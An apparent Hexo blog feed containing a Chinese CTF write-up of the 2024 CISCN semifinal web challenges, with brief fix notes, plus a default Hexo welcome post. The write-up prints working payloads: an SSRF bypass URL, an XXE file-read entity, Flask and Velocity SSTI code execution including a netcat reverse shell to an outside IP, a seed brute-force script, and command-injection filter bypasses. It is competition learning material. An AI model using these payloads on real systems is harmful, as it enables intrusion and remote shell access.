<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bthcls&#39;Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-07-04T10:05:19.886Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bthcls</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2024CISCN半决赛西南赛区Web复现</title>
    <link href="http://example.com/2024/07/04/2024-6-21%20ciscn2024%E5%8D%8A%E5%86%B3%20220416/"/>
    <id>http://example.com/2024/07/04/2024-6-21%20ciscn2024%E5%8D%8A%E5%86%B3%20220416/</id>
    <published>2024-07-04T10:04:41.834Z</published>
    <updated>2024-07-04T10:05:19.886Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024全国大学生信息安全竞赛半决赛西南赛区"><a href="#2024全国大学生信息安全竞赛半决赛西南赛区" class="headerlink" title="2024全国大学生信息安全竞赛半决赛西南赛区"></a>2024全国大学生信息安全竞赛半决赛西南赛区</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>awdp赛制升级版（break and fix），web和pwn，比赛分上半场（break环节）和下半场（fix环节），上半场题目仅允许break，下半场选取上半场部分题目进行fix环节，下半场题目仅允许fix。</p><p>3道pwn，7道web（两道java、两道python、三道php），共10题。</p><p>下午选上午5道web题fix，每道题目fix时间为30分钟。每道题只能cheak一次，check脚本将在题目结束后自动运行。</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>![483f83dee54d7197f0c7917d4ead73d](D:\file\Tenxun_files\WeChat Files\wxid_7cjnbsktm5hi22\FileStorage\Temp\483f83dee54d7197f0c7917d4ead73d.jpg)</p><p>![c48488bb5538fbc7dcb3ccdcdddaac4](D:\file\Tenxun_files\WeChat Files\wxid_7cjnbsktm5hi22\FileStorage\Temp\c48488bb5538fbc7dcb3ccdcdddaac4.jpg)</p><p>![d33f58a6f8617fcc31b90da1a1727ea](D:\file\Tenxun_files\WeChat Files\wxid_7cjnbsktm5hi22\FileStorage\Temp\d33f58a6f8617fcc31b90da1a1727ea.jpg)</p><h2 id="部分公告"><a href="#部分公告" class="headerlink" title="部分公告"></a>部分公告</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>三十分钟后（14：00整）将关闭当前所有break赛题，请参赛选手做好时间管理。</p><p>fix环节比赛时间为14:00到16:30，总时长为2个半小时，共计5道赛题环境，每道题目fix时间为30分钟。</p><p>注意：每道题只能cheak一次，check脚本将在题目结束后自动运行，各位参赛选手可通过风云榜查看得分情况。</p><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><h4 id="zwphpc"><a href="#zwphpc" class="headerlink" title="zwphpc"></a>zwphpc</h4><p>1.Xml是否可覆盖呢？</p><h4 id="mynote"><a href="#mynote" class="headerlink" title="mynote"></a>mynote</h4><p>1.找找管理员的私人笔记内容</p><h4 id="ezssti"><a href="#ezssti" class="headerlink" title="ezssti"></a>ezssti</h4><p>1.源码可能藏在哪里呢？</p><p>2.模板引擎可能会出什么问题呢？</p><h4 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h4><p>你连接的MySQL服务端真的安全吗？</p><h4 id="zwxajava"><a href="#zwxajava" class="headerlink" title="zwxajava"></a>zwxajava</h4><p>1.系统会对上传的配置文件做什么样的处理呢？</p><p>2.只要给我admin，我就可以得到我想要的</p><p>3.flag.txt文件我可以搜</p><h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><p>（1）比赛前，所有参赛选手需将手机、智能手表等通信设备上交至组委会统一保管，赛后统一归还。<br>（2）比赛过程中禁止攻击平台或干扰其他选手正常比赛，禁止对题目场景进行破坏。<br>（3）所有参赛队员（同一队伍的队员除外）禁止使用即时通信软件等渠道与其他人员进行赛题内容沟通交流； 禁止不同队伍之间合作或共享flag、hint等任何比赛相关信息。<br>（4）参赛选手不得私自搭建网络代理将靶场环境进行转发。<br>（5）比赛平台采用严格的反作弊监控机制，对于过程中发现作弊、串题或对比赛平台恶意攻击行为，将采取禁赛、直接取消比赛成绩等处罚措施，情节严重者将由组委会通报参赛队伍所在高校。<br>（6）参赛选手如有竞赛相关问题，可举手向裁判示意，等待裁判到位后进行询问。<br>（7）比赛过程中若发现意外情况，须听从工作人员管理和指挥。<br>（8）比赛结束后20分钟之内提交write-up，文件格式为PDF，文件命名方式”队伍名称.pdf”，例如：zwxa.pdf。<br>（9）write-up有且只能提交一次，提交后团队将无法继续答题。如果比赛过程中某队员自行提交write-up，导致团队无法继续答题，则后果自负。<br>（10）赛场部署360度无死角监控系统，参赛选手不得私自离开比赛区域，若有生理需求请向裁判或工作人员举手示意。<br>（11）参赛选手请基于本地进行录屏，便于后续申诉或仲裁作为相关举证材料。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>mynote无黑盒思路，其他全复现</p><h3 id="ssrf2rce"><a href="#ssrf2rce" class="headerlink" title="ssrf2rce"></a>ssrf2rce</h3><h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p>源文件目录</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618171036329.png" alt="image-20240618171036329"></p><p>index.html，只有一个功能点，可跳转至ssrf.php</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618171346979.png" alt="image-20240618171346979"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618171152580.png" alt="image-20240618171152580"></p><p>对GET传参url正则匹配判断，匹配到<a href="http://ciscn.(.*/?)@127.0.0.1/flag.php?look%EF%BC%8C%E7%BB%A7%E7%BB%AD%E4%B8%8B%E4%B8%80%E6%AD%A5%E5%88%A4%E6%96%AD%EF%BC%8C%E4%B8%8D%E5%85%81%E8%AE%B8%E6%9C%89file://%EF%BC%8C%E8%BE%93%E5%87%BA%E8%AF%BB%E5%8F%96fllllllaaaaaaag.php%E7%9A%84%E7%BB%93%E6%9E%9C">http://ciscn.(.*?)@127.0.0.1/flag.php?look，继续下一步判断，不允许有file://，输出读取fllllllaaaaaaag.php的结果</a></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618171522847.png" alt="image-20240618171522847"></p><p>跟进fllllllaaaaaaag.php提示coooooomand.php，目录扫描flag.php也能得知提示</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618171950587.png" alt="image-20240618171950587"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618172033476.png" alt="image-20240618172033476"></p><p>传参?url&#x3D;<a href="http://ciscn.bthcls@127.0.0.1/flag.php?look">http://ciscn.bthcls@127.0.0.1/flag.php?look</a></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618172202622.png" alt="image-20240618172202622"></p><p>简单的命令执行，绕过即可</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618172320240.png" alt="image-20240618172320240"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618172341018.png" alt="image-20240618172341018"></p><p>windows复现环境，所以用的windows命令</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618173727918.png" alt="image-20240618173727918"></p><h4 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h4><p>因为不知道check是什么情况，这里我觉得禁用大部分可能会导致绕过的情况比较好，不建议删除或者是全部过滤。</p><h3 id="weblog-1"><a href="#weblog-1" class="headerlink" title="weblog"></a>weblog</h3><p>php语言，blog网站，有后台，文章数据库增删改查，数据库连接</p><h4 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h4><p>源码目录结构</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618174649822.png" alt="image-20240618174649822"></p><p>首页，环境不对</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618175443309.png" alt="image-20240618175443309"></p><p>本地复现环境，先注释error_reporting(0);，注释数据库测试连接</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618180230427.png" alt="image-20240618180230427"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618180224963.png" alt="image-20240618180224963"></p><p>修改数据库配置信息</p><p>添加数据库结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> Navicat Premium Data Transfer</span><br><span class="line"></span><br><span class="line"> Source Server         : 本地</span><br><span class="line"> Source Server Type    : MySQL</span><br><span class="line"> Source Server Version : 50726 (5.7.26-log)</span><br><span class="line"> Source Host           : localhost:3306</span><br><span class="line"> Source Schema         : blog</span><br><span class="line"></span><br><span class="line"> Target Server Type    : MySQL</span><br><span class="line"> Target Server Version : 50726 (5.7.26-log)</span><br><span class="line"> File Encoding         : 65001</span><br><span class="line"></span><br><span class="line"> Date: 20/06/2024 11:29:59</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for articles</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `articles`;</span><br><span class="line">CREATE TABLE `articles`  (</span><br><span class="line">  `id` int(255) NULL DEFAULT NULL,</span><br><span class="line">  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  `date` date NULL DEFAULT NULL,</span><br><span class="line">  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL</span><br><span class="line">) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of articles</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `articles` VALUES (1, &#x27;test&#x27;, &#x27;2024-06-19&#x27;, &#x27;testaaaa&#x27;);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure><p>存在sql注入</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620113106539.png" alt="image-20240620113106539"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620112943842.png" alt="image-20240620112943842"></p><p>连接外部数据库</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620113729919.png" alt="image-20240620113729919"></p><p>mysql客户端直连复现</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620163039207.png" alt="image-20240620163039207"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620163139350.png" alt="image-20240620163139350"></p><p>该题复现要求php版本低于7.3.4，所以开始一直没有复现成功，以为是要数据库版本低一点才可以。</p><p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain/">https://lorexxar.cn/2020/01/14/css-mysql-chain/</a></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620173819614.png" alt="image-20240620173819614"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620173843447.png" alt="image-20240620173843447"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620173854621.png" alt="image-20240620173854621"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620173944449.png" alt="image-20240620173944449"></p><h4 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h4><p>修复sql注入</p><p>对请求的外部ip做白名单限制</p><h3 id="zhphp"><a href="#zhphp" class="headerlink" title="zhphp"></a>zhphp</h3><p>主机管理系统，录入和查询两个功能，主机信息储存在xml文件中</p><h4 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h4><p>备份文件泄露，phpinfo.php是我后加的调试文件</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620105409443.png" alt="image-20240620105409443"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620194109995.png" alt="image-20240620194109995"></p><p>passwarekitforensic爆破密码，靶场复现题密码改为dddd</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620025207463.png" alt="image-20240620025207463"></p><p>record.php存在变量覆盖</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240619152648390.png" alt="image-20240619152648390"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240619133601864.png" alt="image-20240619133601864"></p><p>导致xml文件内容可以构造</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620105526633.png" alt="image-20240620105526633"></p><p>在请求头中会输出内容，但是注意要编码读取到的文件内容，否则文件头不允许存在多行内容会报错</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240619152708268.png" alt="image-20240619152708268"></p><p>构造hostname和port</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;hostname&gt;&amp;goodies;&lt;/hostname&gt;</span><br><span class="line">    &lt;port&gt;7777&lt;/port&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620200048275.png" alt="image-20240620200048275"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620200105921.png" alt="image-20240620200105921"></p><h4 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h4><p>extract($_REQUEST);</p><p>对请求添加过滤或禁用外部实体防止xxe或黑名单过滤xxe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><h3 id="flaskweb"><a href="#flaskweb" class="headerlink" title="flaskweb"></a>flaskweb</h3><p>flask框架、html模板、aes-ecb加解密、debug调试模式</p><p>错误页面</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618222719771.png" alt="image-20240618222719771"></p><h4 id="break-3"><a href="#break-3" class="headerlink" title="break"></a>break</h4><p>密钥泄露</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618231321143.png" alt="image-20240618231321143"></p><p>源码泄露</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618231349232.png" alt="image-20240618231349232"></p><p>存在模板注入，构造加密函数传参非法路径即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def encrypt(text, key):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 此函数将对给定的文本进行加密</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    try:</span><br><span class="line">        # 将文本编码为字节</span><br><span class="line">        text_bytes = text.encode()</span><br><span class="line">        # 使用PKCS7填充机制填充字节数据</span><br><span class="line">        padded_text = pad(text_bytes, AES.block_size)</span><br><span class="line">        # 加密填充后的字节数据</span><br><span class="line">        encrypted_text = cipher.encrypt(padded_text)</span><br><span class="line">        # 将加密后的字节数据转换为十六进制字符串</span><br><span class="line">        return binascii.hexlify(encrypted_text).decode()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # 处理加密过程中可能发生的异常</span><br><span class="line">        error_message = f&quot;Error: &#123;str(e)&#125;&quot;</span><br><span class="line">        return error_message</span><br><span class="line">    </span><br><span class="line">text = &quot;&#123;&#123;1111111111+9&#125;&#125;&quot;</span><br><span class="line">key = b&#x27;0123456789abcdef&#x27;</span><br><span class="line">print(encrypt(text, key))</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618231125877.png" alt="image-20240618231125877"></p><p>构造攻击payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[242].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618233520441.png" alt="image-20240618233520441"></p><h4 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h4><p>密钥泄露代码删除或对解密后的值进行判断过滤再渲染</p><h3 id="mynote-1"><a href="#mynote-1" class="headerlink" title="mynote"></a>mynote</h3><p><a href="https://tyskill.github.io/posts/starctf2021/">https://tyskill.github.io/posts/starctf2021/</a></p><p>学习生活笔记平台，python，随机数，后台，ping</p><p>构建数据库结构和插入示例数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> Navicat Premium Data Transfer</span><br><span class="line"></span><br><span class="line"> Source Server         : 本地</span><br><span class="line"> Source Server Type    : MySQL</span><br><span class="line"> Source Server Version : 50726 (5.7.26-log)</span><br><span class="line"> Source Host           : localhost:3306</span><br><span class="line"> Source Schema         : ctf</span><br><span class="line"></span><br><span class="line"> Target Server Type    : MySQL</span><br><span class="line"> Target Server Version : 50726 (5.7.26-log)</span><br><span class="line"> File Encoding         : 65001</span><br><span class="line"></span><br><span class="line"> Date: 21/06/2024 21:33:05</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for notes</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `notes`;</span><br><span class="line">CREATE TABLE `notes`  (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `user_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `note_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `text` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `timestamp` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,</span><br><span class="line">  `post_at` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `prv` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 33 CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of notes</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `notes` VALUES (32, &#x27;bhii11ocinpo9whnj6db4i8vzr4x98pd&#x27;, &#x27;9m29y9gbpst0e7zofthug0gf2xfko5i8&#x27;, &#x27;My secret is :/admin_tool_online/pingphzzznwzkbg&#x27;, &#x27;secret&#x27;, &#x27;1718976680.4689&#x27;, &#x27;2024-06-21 13:31 UTC&#x27;, &#x27;True&#x27;);</span><br><span class="line">INSERT INTO `notes` VALUES (31, &#x27;bhii11ocinpo9whnj6db4i8vzr4x98pd&#x27;, &#x27;lft7tbkv75oexrpu2u5p8m1ap1cr6o4h&#x27;, &#x27;this is my first note&#x27;, &#x27;hello&#x27;, &#x27;1718976625.0916&#x27;, &#x27;2024-06-21 13:30 UTC&#x27;, &#x27;False&#x27;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for users</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `users`;</span><br><span class="line">CREATE TABLE `users`  (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `user_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE,</span><br><span class="line">  UNIQUE INDEX `username`(`username`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 24 CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of users</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `users` VALUES (23, &#x27;bhii11ocinpo9whnj6db4i8vzr4x98pd&#x27;, &#x27;bthcls756&#x27;);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure><h4 id="break-4"><a href="#break-4" class="headerlink" title="break"></a>break</h4><p>首页</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621213505157.png" alt="image-20240621213505157"></p><p>创建笔记页面，泄露了源代码</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621213526867.png" alt="image-20240621213526867"></p><p>根据时间戳设定随机数种子，生成user_id</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">timestamp = round(time.time(), 4)</span><br><span class="line">random.seed(timestamp)</span><br><span class="line">user_id = get_random_id()</span><br></pre></td></tr></table></figure><p>根据时间戳生成post_at，再用user_id和post_at拼接生成随机数种子，最后根据随机数种子生成note_id</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">timestamp = round(time.time(), 4)</span><br><span class="line">post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d %H:%M UTC&amp;#39;)</span><br><span class="line">random.seed(user_id + post_at)</span><br><span class="line">note_id = get_random_id()</span><br></pre></td></tr></table></figure><p>访问公开笔记，可获得note_id和post_at<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621214048150.png" alt="image-20240621214048150"></p><p>创建一条测试的私人笔记，查看源码</p><p>鉴权规则为session或get传参user_id</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621214336276.png" alt="image-20240621214336276"></p><p>可爆破随机数种子，构造代码，获取bthcls756用户的user_id来查看其私人笔记</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*-coding-*-: utf-8</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">post_at = &quot;2024-06-21 13:30 UTC&quot;</span><br><span class="line"></span><br><span class="line">def get_random_id():</span><br><span class="line">    alphabet = list(string.ascii_lowercase + string.digits)</span><br><span class="line">    return &#x27;&#x27;.join([random.choice(alphabet) for _ in range(32)])</span><br><span class="line"></span><br><span class="line">users = [i / 10000 for i in range(0, 10000)]</span><br><span class="line">for second in range(0, 60):</span><br><span class="line">    dt = &quot;2024-06-21 21:30:&#123;&#125; UTC&quot;.format(second) # datetime.timezone.utc有时差</span><br><span class="line">    timeArray = time.strptime(dt, &quot;%Y-%m-%d %H:%M:%S UTC&quot;) # 转换成时间数组</span><br><span class="line">    timestamp = time.mktime(timeArray) # 转换成时间戳</span><br><span class="line">    for user in users:</span><br><span class="line">        # 获得user_id</span><br><span class="line">        seed = timestamp + user</span><br><span class="line">        random.seed(seed)</span><br><span class="line">        user_id = get_random_id()</span><br><span class="line">        # 获得note_id</span><br><span class="line">        random.seed(user_id + post_at)</span><br><span class="line">        if get_random_id() == &quot;lft7tbkv75oexrpu2u5p8m1ap1cr6o4h&quot;:</span><br><span class="line">            print(user_id) # 7bdeij4oiafjdypqyrl2znwk7w9lulgn</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621214552772.png" alt="image-20240621214552772"></p><p>根据获取的user_id访问bthcls756的私人笔记</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621214712152.png" alt="image-20240621214712152"></p><p>得到后台工具ping的路径</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621214732831.png" alt="image-20240621214732831"></p><p>会返回cmd命令和结果，可以fuzz测试waf</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621220029804.png" alt="image-20240621220029804"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|ls </span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621220052941.png" alt="image-20240621220052941"></p><p>cat和空格被替换为空</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat app.py</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621220122884.png" alt="image-20240621220122884"></p><p>尝试使用双写绕过cat，$IFS$9绕过空格</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cacatt$IFS$9app.py</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621220334623.png" alt="image-20240621220334623"></p><p>双写绕过无疑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cacatt$IIFSFS$9app.py</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240621220357781.png" alt="image-20240621220357781"></p><p>WAF形式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h4 id="fix-4"><a href="#fix-4" class="headerlink" title="fix"></a>fix</h4><h3 id="ezssti-1"><a href="#ezssti-1" class="headerlink" title="ezssti"></a>ezssti</h3><p>java、ssti、</p><h4 id="break-5"><a href="#break-5" class="headerlink" title="break"></a>break</h4><p>Velocity模板</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620110022431.png" alt="image-20240620110022431"></p><p>没有过滤</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620110054918.png" alt="image-20240620110054918"></p><p>命令执行无回显，反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;nc 172.16.17.228 2333 -e /bin/bash&quot;)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240619223025887.png" alt="image-20240619223025887"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>vscode可以在断网情况下查看函数定义？</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618172541455.png" alt="image-20240618172541455"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024全国大学生信息安全竞赛半决赛西南赛区&quot;&gt;&lt;a href=&quot;#2024全国大学生信息安全竞赛半决赛西南赛区&quot; class=&quot;headerlink&quot; title=&quot;2024全国大学生信息安全竞赛半决赛西南赛区&quot;&gt;&lt;/a&gt;2024全国大学生信息安全竞赛半决赛西南</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2024/07/01/hello-world/"/>
    <id>http://example.com/2024/07/01/hello-world/</id>
    <published>2024-07-01T13:12:51.765Z</published>
    <updated>2024-07-01T13:12:51.765Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo 